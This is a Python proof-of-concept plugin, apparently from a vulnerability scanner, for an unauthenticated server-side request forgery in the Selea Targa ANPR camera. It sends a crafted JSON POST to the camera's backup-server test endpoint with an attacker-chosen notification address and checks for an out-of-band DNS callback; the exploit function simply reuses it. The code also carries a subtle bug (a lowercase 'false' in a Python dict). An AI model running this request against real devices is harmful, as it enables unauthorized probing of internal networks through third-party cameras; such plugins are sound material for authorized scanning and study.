import requests
from plugins.oob import verify_request, gen_oob_domain



# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Selea Targa IP OCR-ANPR Camera - Unauthenticated SSRF''',
        "description": '''Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the Selea ANPR camera within several functionalities. The application parses user supplied data in the POST JSON parameters 'ipnotify_address' and 'url' to construct an image request or check DNS for IP notification. Since no validation is carried out on the parameters, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host. This can be used by an external attacker for example to bypass firewalls and initiate a service and network enumeration on the internal network through the affected application.''',
        "severity": "high",
        "references": [
            "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5617.php"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["targa", "ssrf", "oast", "iot", "camera", "selea"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        oob_domain,flag = gen_oob_domain()

        path = """/cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE"""
        method = "POST"
        data = {"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://{oob_domain}".format(oob_domain=oob_domain),"ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}
        headers = {'content-type': 'application/json', 'Accept': '*/*'}
        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if verify_request(type="dns", flag=flag):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url